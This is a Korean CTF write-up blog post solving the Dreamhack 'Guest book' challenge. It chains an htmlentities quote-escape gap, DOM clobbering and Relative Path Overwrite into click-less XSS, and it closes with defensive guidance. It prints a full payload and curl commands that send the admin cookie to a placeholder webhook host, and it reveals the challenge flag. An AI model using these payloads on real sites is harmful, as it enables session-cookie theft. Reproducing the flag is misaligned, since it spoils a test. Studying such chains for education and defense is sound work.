---
layout: post
title:  "Dreamhack 워게임 Guest book 풀이 — DOM clobbering + RPO로 click 없이 XSS 자동 실행"
date:   2026-05-16 10:30:00 +0900
categories: security web wargame dreamhack writeup xss dom-clobbering rpo
---

## 들어가며

Dreamhack 웹해킹 워게임 **Guest book** (난이도 Gold 2) 풀이입니다. 표면적으로는 "마크다운 링크 한 줄 들어가는 PHP 방명록" 인데, 실제로는 사이버보안 입문자가 한 번에 익히기 어려운 **DOM clobbering + Relative Path Overwrite + click-less XSS** 의 3박자 콤보가 의도된 풀이입니다.

문제 설명:

> php로 개발 중인 방명록 서비스입니다.
> 글을 쓰는 기능과, 오류가 발생하는 주소를 관리자가 확인할 수 있도록 하는 Report기능이 존재합니다.
> 플래그는 관리자의 쿠키에 포함되어 있습니다.

스포일러로 결론:

```bash
# 한 줄짜리 (URL 인코딩 길어서 줄바꿈)
PATH_VAL="GuestBook.php/x?content=[a](' id=CONFIG x=z)[b](' id=CONFIG name=debug x=z)[c](javascript:document.location=\`https://WEBHOOK/?\`+document.cookie ' id=CONFIG name=main x=z)"
curl -X POST "$SERVER/Report.php" --data-urlencode "path=$PATH_VAL"
# → webhook 에 flag=DH{26763025e32e6b24fedfc3206054d6a7} 도착
```

핵심 트릭 3개:

1. **`addLink` 의 `'` escape 누락** → `<a href='...'>` 속성 탈출.
2. **DOM clobbering with HTMLCollection** → `window.CONFIG.debug`, `window.CONFIG.main` 을 anchor 요소로 위장.
3. **RPO via PATH_INFO** → 상대 경로 `config.js` 가 `GuestBook.php/config.js` 로 풀려서 JS 파싱 실패 → 우리의 DOM clobbering 이 살아남음.

> Note: 사이버보안 입문 학습용 PoC. 실제 운영 서비스 대상 사용 금지.

## 1. 자료 파악

ZIP 에는 `util.php` 한 파일만:

```php
function addLink($content){
  $content = htmlentities($content);                                 // ① 우선 escape
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/',
                          "<a href='$2'>$1</a>", $content);          // ② 그 다음 raw 치환
  return $content;
}
```

라이브 서버에서 추가로 노출되는 것:

- `GuestBook.php?content=...` — 사용자 입력을 `<pre>{addLink(content)}</pre>` 로 렌더링
- `Report.php` (POST `path=...`) — 봇이 admin 으로 로그인한 채 `http://127.0.0.1/<path>` 방문
- 모든 페이지 끝에 `<script src="config.js"></script><script> if (window.CONFIG && window.CONFIG.debug) location.href = window.CONFIG.main; </script>`
- `config.js`:

  ```js
  window.CONFIG = { version: "v0.1", main: "/", debug: false, debugMSG: "" };
  Object.freeze(window.CONFIG);
  ```

이 5가지를 합치면 공격 표면이 결정된다.

## 2. 단서 정리

### 2-1. `addLink` 의 함정

`htmlentities` 가 escape 하는 문자는 **버전/플래그 따라 다르다**. PHP 7.x 의 일부 빌드는 **기본 `ENT_COMPAT`** 라 `"` 만 escape 하고 **`'` 는 그대로** 둔다.

실험으로 확인:

```bash
curl -G "$SERVER/GuestBook.php" --data-urlencode "content=[x](abc'def)"
# → <pre><a href='abc'def'>x</a></pre>     ← ' 가 살아 있음
```

즉, URL 부분 `$2` 안에 `'` 를 넣으면 **`href='...'` 의 single quote 를 깨고 새 attribute 를 주입** 할 수 있다.

### 2-2. 봇은 클릭하지 않는다

테스트해보면 봇은 단순히 `driver.get(url)` 만 호출하고 페이지 안의 `<a>` 를 클릭하거나 hover 하지 않는다. 따라서 `<a href='javascript:...'>` 같은 **클릭 의존성 XSS** 는 불발. **클릭 없이 자동 실행되는** 경로가 필요.

페이지 끝의 인라인 스크립트가 정답이다.

```html
<script src="config.js"></script>
<script>
  if (window.CONFIG && window.CONFIG.debug) {
    location.href = window.CONFIG.main;
  }
</script>
```

이 두 줄이 우리에게 주는 것: **`window.CONFIG.debug` 가 truthy 이고 `window.CONFIG.main` 이 `javascript:...` URL 이면, 자동으로 `location.href = javascript:...` 가 평가되어 JS 가 실행** 된다.

따라서 목표는 `window.CONFIG` 를 우리 입맛대로 만들기.

### 2-3. config.js 를 무력화하기

문제: config.js 가 먼저 로드되어 `window.CONFIG = {debug:false, ...}` 를 박아버린다. 우리의 DOM clobbering 은 `window.CONFIG = HTMLCollection` 으로 만드는데, config.js 가 곧 덮어쓴다.

해법: **config.js 를 로드 실패시킨다**.

페이지의 `<script src="config.js">` 는 **상대 경로**. 현재 페이지 URL 이 `/GuestBook.php` 라면 `config.js` → `/config.js`. 정상 로드.

하지만 페이지가 `/GuestBook.php/x` 라면 (PATH_INFO 추가) — `config.js` → `/GuestBook.php/config.js`. Apache + PHP 는 이 요청을 다시 GuestBook.php 에 routing 한다 (`PATH_INFO=/config.js`). 응답은 GuestBook.php 의 HTML.

브라우저는 HTML 을 JS 로 파싱하려고 시도하지만 `<html>` 부터 syntax error. **스크립트가 사실상 실행되지 않음 → window.CONFIG 미할당**. 우리의 DOM clobbering 이 유효.

이게 **Relative Path Overwrite (RPO)** 의 클래식 패턴.

### 2-4. DOM clobbering 구조

`window.CONFIG` 가 HTMLCollection 이 되려면 **id=CONFIG 인 요소를 2개 이상** 두면 된다. HTMLCollection 의 named getter 는 `id` 또는 `name` 으로 멤버 검색.

- `window.CONFIG.debug` → collection 안 `name="debug"` 인 요소
- `window.CONFIG.main` → collection 안 `name="main"` 인 요소

`<a>` 의 `toString()` 은 `href` URL 을 반환한다. 따라서 `location.href = anchor_with_name_main` 은 `location.href = "javascript:..."` 와 같다.

구조 (목표):

```html
<a id=CONFIG ...>                          ← 멤버 1 (id=CONFIG 카운트)
<a id=CONFIG name=debug ...>              ← 멤버 2 (CONFIG.debug)
<a id=CONFIG name=main href="javascript:exfil()">  ← 멤버 3 (CONFIG.main)
```

`addLink` 로 만들 수 있는 것은 `<a href='$2'>$1</a>` 의 단일 anchor 뿐이지만, **3개의 markdown 링크** 를 연속으로 쓰면 3개의 `<a>` 생성. 각각의 `$2` 에 `'` 트릭으로 속성을 주입.

## 3. 페이로드 빌드

### 3-1. 속성 주입의 디테일

가장 쉬운 mistake 는 `$2 = "' id=CONFIG x="` 처럼 trailing `=` 으로 끝내는 것. 이렇게 하면 템플릿의 `'>` 가 붙으면서 `x='` 가 되어 quoted-value 가 열린다. 다음 `'` 까지 모든 게 attribute value 로 빨려 들어가 anchor 경계가 깨진다.

해결책: trailing `=` 대신 **non-special 값으로 attribute 를 닫아둔다**. 예: `x=z`.

```
$2 = "' id=CONFIG x=z"
→ output: <a href='' id=CONFIG x=z'>$1</a>
parse:
  href=''           (empty)
  id=CONFIG
  x=z'              (unquoted value "z'")
  >$1</a>
```

`x` 의 값으로 `z'` 가 들어가는 건 우리 입장에서 무해. 중요한 건 **anchor 가 정상적으로 `>` 에서 닫혀서 다음 `<a>` 와 분리** 된다는 것.

### 3-2. 3개의 anchor

```
[a](' id=CONFIG x=z)                                                         ← anchor 1
[b](' id=CONFIG name=debug x=z)                                              ← anchor 2
[c](javascript:document.location=`//WEBHOOK/?`+document.cookie ' id=CONFIG name=main x=z)   ← anchor 3
```

anchor 3 의 URL 에는 **`(` `)` 를 쓰지 않는다**. `addLink` 의 정규식이 lazy 라 첫 `)` 에서 URL 종료. `fetch(...)` 는 `(`/`)` 가 있어 부적합. 대신 `document.location = \`...\` + document.cookie` 로 작성.

backtick (`` ` ``) 은 htmlentities 가 escape 하지 않으므로 그대로 통과.

### 3-3. 렌더링 검증

```bash
curl "$SERVER/GuestBook.php/x?content=[a](' id=CONFIG x=z)..."
```

응답 안의 `<pre>` 블록:

```html
<a href='' id=CONFIG x=z'>a</a>
<a href='' id=CONFIG name=debug x=z'>b</a>
<a href='javascript:document.location=`...`+document.cookie '
   id=CONFIG name=main x=z'>c</a>
```

3 개의 anchor 모두 `id=CONFIG`. 두 번째에 `name=debug`. 세 번째에 `name=main` + javascript: URL. ✓

### 3-4. Report 트리거

```bash
PATH_VAL='GuestBook.php/x?content=...'   # 위와 동일
curl -X POST "$SERVER/Report.php" --data-urlencode "path=$PATH_VAL"
```

- 봇이 `http://127.0.0.1/GuestBook.php/x?content=...` 방문 (admin 쿠키 포함)
- `<script src="config.js">` → 상대 경로 → `/GuestBook.php/config.js` → 응답이 HTML → JS 파싱 실패 → `window.CONFIG` 미할당
- DOM clobbering 으로 `window.CONFIG = HTMLCollection of [anchor1, anchor2, anchor3]`
- 인라인 스크립트:
  - `window.CONFIG` → HTMLCollection → truthy
  - `window.CONFIG.debug` → anchor2 (name=debug) → truthy
  - `location.href = window.CONFIG.main` → `location.href = anchor3` → `String(anchor3)` = href URL = `javascript:document.location=\`//WEBHOOK/?\`+document.cookie ` → 실행!
- `document.location = "//WEBHOOK/?" + document.cookie` 가 평가되어 admin 쿠키와 함께 webhook 으로 navigation.

### 3-5. flag 수확

```
webhook.site → GET /?flag=DH{26763025e32e6b24fedfc3206054d6a7}
```

flag: `DH{26763025e32e6b24fedfc3206054d6a7}` ✓

## 4. 취약점 해설

이 한 문제 안에 **3가지 클래식 클래스** 가 결합되어 있다. 입문자에겐 한 번에 다 보기 어렵지만 분리해서 익혀두면 강력하다.

### 4-1. htmlentities 의 함정

- PHP 의 `htmlentities` 는 **default flag 가 버전마다 다르다**. 5.4 이전엔 ENT_COMPAT (`"`만 escape). 5.4 ~ 8.0 은 ENT_QUOTES (both `'` and `"`). 8.1+ 다시 default 가 명시화됨.
- 어느 escape mode 든 `<` `>` `&` 는 항상 escape. 하지만 `'` 는 **flag 미지정 시 안전을 보장 못 함**.
- **방어**: 명시적으로 `htmlentities($x, ENT_QUOTES | ENT_HTML5, 'UTF-8')` 또는 `htmlspecialchars` 사용. 더 안전하게 attribute context 면 **double-quote 로 감싸기** (`<a href="$x">`) — 그러면 `"` escape 만 신경 쓰면 됨.

### 4-2. 클릭 없이 XSS 트리거 — `location.href = obj` + DOM clobbering

- `location.href = X` 는 X 를 toString. anchor 의 toString 은 `href`. → 임의 URL 로 navigation. javascript: URL 이면 그 자리에서 JS 평가.
- DOM clobbering: HTML 요소의 `id`, `name` 이 자동으로 `window.X` 로 노출. 같은 id 가 다수면 HTMLCollection. 컬렉션은 named getter 로 항목 접근.
- 이 두 가지를 모르면 "클릭이 없으면 anchor 기반 XSS 불가능" 이라고 잘못 결론지을 수 있다.

### 4-3. RPO — `<script src="config.js">` 의 상대 경로

- 브라우저는 `<script src>` 의 상대 경로를 **현재 document URL 기준으로** 해결. 페이지 path 한 단을 늘리면 모든 상대 자원의 base path 가 바뀐다.
- Apache + PHP 의 PATH_INFO 동작과 결합되면 `script src="config.js"` 가 `index.php/config.js` 로 잘못 매핑 → HTML 응답을 JS 로 해석 → silent script load 실패.
- 이게 **Relative Path Overwrite** 의 본질. 같은 문제 시리즈의 `Relative Path Overwrite (id=439)` 도 같은 카테고리.

### 4-4. 위험성 종합

- htmlentities 의 default 가 `'` 를 빠뜨리는 환경에서, **single-quote 로 감싼 모든 attribute context** 가 즉시 잠재 XSS.
- `<script src>` 와 `<link href>` 의 상대 경로가 있는 페이지가 **path-info 를 받는 동적 endpoint** 위에 있으면 RPO 가 항상 가능.
- DOM clobbering 은 `window.X`/`document.X` 를 사용하는 모든 코드의 잠재적 우회 표면. 특히 "config object" 형태의 전역에 의존하는 패턴은 위험.

### 4-5. 올바른 방어

1. **htmlentities 는 항상 명시적 flag**: `htmlentities($x, ENT_QUOTES | ENT_HTML5, 'UTF-8')`. 또는 `htmlspecialchars` 와 동일하게 신뢰성 있는 함수만.
2. **속성은 double-quote 로 감싸기**. 그리고 user input 은 attribute 안에 두지 말고, `textContent`/`innerText` 등 텍스트 컨텍스트에서만 쓰기.
3. **markdown → HTML 변환은 안정된 라이브러리** (`league/commonmark` 등). 자체 정규식 변환은 거의 항상 깨진다.
4. **전역 객체에 의존하지 말 것**. `window.CONFIG` 같은 전역 대신 모듈 스코프 변수 / `let` / closure 사용. DOM clobbering 표면을 없앤다.
5. **`<script src>` 와 `<link href>` 는 절대 경로 또는 `<base>` 명시**. RPO 표면을 닫는다.
6. **PHP 의 `AcceptPathInfo Off`** 로 PATH_INFO 자체를 비활성화 (해당 endpoint 가 path-info 를 의도하지 않으면).
7. **CSP** 적용. `script-src 'self' 'nonce-XYZ'` + `style-src` 함께. javascript: URL 도 `script-src` 가 막는다.

## 5. 정리 — 입문자가 가져갈 교훈

- "클릭이 필요해서 XSS 안 됨" 은 한 단계 더 파고들 신호. **`location.href` 에 anchor 를 박는 인라인 스크립트** 가 어딘가에 있으면 클릭 없이 자동 발화.
- **DOM clobbering** 은 모르면 영원히 못 본다. 한 번 익히면 SSTI/XSS/redirect 우회의 1티어 도구. id/name 으로 window.X 가 만들어진다는 사실, HTMLCollection 이 named getter 를 가진다는 사실.
- **RPO** 도 같은 부류. `<script src>` 가 상대 경로면 페이지 path 의 차이가 자원 해결에 직접 영향. 특히 PHP/Apache 의 PATH_INFO 환경에서 결정적 우회 통로.
- 한 문제에 여러 클래스가 결합되어 있을 수 있다. Bronze/Silver 와 Gold 의 차이는 보통 "단일 트릭" vs "체인" 의 차이.

같은 카테고리의 다음 단계로 **Guest book Advanced**, **DOM Clobbering Wiki (Gareth Heyes)**, **Relative Path Overwrite Advanced (id=440)** 를 풀어보면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. 봇이 클릭한다고 가정

처음에 단순한 `[click](javascript:fetch(...))` payload 를 Report 로 보내고 webhook 을 폴링. 5초 기다려도 아무 도착 없음. 그제서야 "봇은 페이지를 GET 만 하고 클릭/hover 하지 않는다" 를 인지.

**회고**: 봇 기반 XSS 문제는 항상 **클릭 없이 자동 실행되는 경로** 가 있어야 함을 먼저 가정하자. 그게 없으면 문제가 풀리지 않는다.

### 실패 2. `x=` 로 끝내서 quote 가 줄줄이 새는 anchor 만듦

첫 시도에서 `$2 = "' id=CONFIG x="` 형태로 끝냈더니, 템플릿의 `'>` 와 합쳐져 `x='` 가 되어 quoted-value 가 열림. 다음 `'` 까지 모두 attribute value 로 빨려 들어가 3 개의 anchor 가 하나로 뭉침 → 모든 DOM clobbering 깨짐.

```
<a href='' id=CONFIG x='>a</a>...  ← x value 가 "다음 '" 까지
```

**회고**: HTML attribute injection 을 할 때, **trailing `=` 으로 끝나는 attribute 는 위험**. 항상 값을 unquoted 로 채워서 (`x=z`) 다음 `'` 가 unquoted value 의 일부로 흡수되게 만들자.

### 실패 3. JS payload 에 `()` 를 그대로 썼다가 regex 가 일찍 종료

처음에 `fetch('//evil.com')` 형태로 시도. `(.*?)` 가 lazy 라 첫 `)` 에서 멈춤 → URL = `fetch('//evil.com'`. 깨진 syntax.

**회고**: `addLink` 같은 markdown-style 정규식이 lazy 매칭이면 URL 안에 **괄호를 쓰지 말 것**. `document.location = \`...\` + document.cookie` 로 대체. JS 의 backtick template literal 이 이런 경우에 매우 유용.

### 실패 4. config.js 를 그냥 무시하고 DOM clobbering 만 했다가 안 됨

DOM clobbering payload 가 잘 들어갔는데 webhook 에 아무 도착 없음. 한참 디버깅하다가 "아, config.js 가 우리 DOM clobbering 을 덮어쓰는구나" 를 인지. 해결책: path 에 `/x` 끼워서 RPO 로 config.js 무력화.

**회고**: `<script src>` 가 페이지에 있으면, 그게 항상 우리의 DOM clobbering 을 덮어쓸 위험이 있다. 무력화하려면 (a) script load 자체를 실패시키거나, (b) 그 스크립트가 우리 객체를 안 건드리게 만들거나, (c) 우리 객체를 `Object.defineProperty` 로 lock 하거나. PHP/Apache 환경이면 RPO 가 가장 깔끔한 (a) 의 형태.

### 실패 5. PHP 의 htmlentities default 를 잘못 알고 있었음

처음에 "PHP 7+ 는 default 가 ENT_QUOTES 라 `'` 도 escape 된다" 고 가정. 실제 서버는 그렇지 않음. 직접 테스트 (`curl -G "$SERVER/GuestBook.php" --data-urlencode "content=[x](a'b)"`) 로 확인 후 우회 가능 판단.

**회고**: PHP escape 함수의 default flag 는 **항상 직접 테스트** 로 확인. 버전, 빌드, 설치된 모듈, 명시적 인자 등 변수가 많다. "기억하는 default" 를 믿지 말 것.
